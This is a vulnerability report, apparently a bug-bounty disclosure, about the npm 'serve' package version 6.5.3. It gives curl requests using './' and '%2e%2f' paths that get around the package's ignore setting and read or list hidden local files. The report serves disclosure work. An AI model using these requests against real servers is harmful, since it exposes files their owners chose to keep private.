Summary:

I would like to report a vulnerability in **serve**.
It allows listing directory and reading local files on the target server.

# Module

**module name:** serve
**version:** 6.5.3
**npm page:** `https://www.npmjs.com/package/serve`

## Module Description

Ever wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.

In addition, it's also awesome when it comes to serving static sites!

# Vulnerability

## Steps To Reproduce:

* Install serve:

`$ npm i serve`

* Create some child directories, files for demonstration:

`$ mkdir dir`

`$ echo "This is secret content!!" > dir/secret.txt`

`$ mkdir dir/dir2`

`$ touch dir/dir2/3.txt`

* Create an application that uses `serve` for file serving listing and set a few folders and files in the ignore config.

```
const serve = require('serve')
const server = serve(__dirname, {
      port: 6060,
      ignore: ['dir/secret.txt', 'dir/dir2']
})
```

* Run the app

`$ node app.js`

Now, the current directory will be served by this module on port `6060` with the exception of file `dir/secret.txt` and directory `'dir/dir2`.

* If we try to request these ignored files/directories, we get a Not Found error

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'
Not Found
```

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/dir2/'
Not Found
```

or if we replace `e` character with URI encoded form `%65`, it still be ignored:

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/s%65cret.txt'
Not Found
```

* However, I found a way to access that file by using dot-slash.

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'
This is secret content!!
```

Or listing the directory:

`http://127.0.0.1:6060/dir/%2e%2fdir2/`

{F279456}

## Supporting Material/References:

* macOS High Sierra 10.13.3
* node v8.10.0
* npm 5.8.0
* Chrome Version 65.0.3325.162 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

It bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.
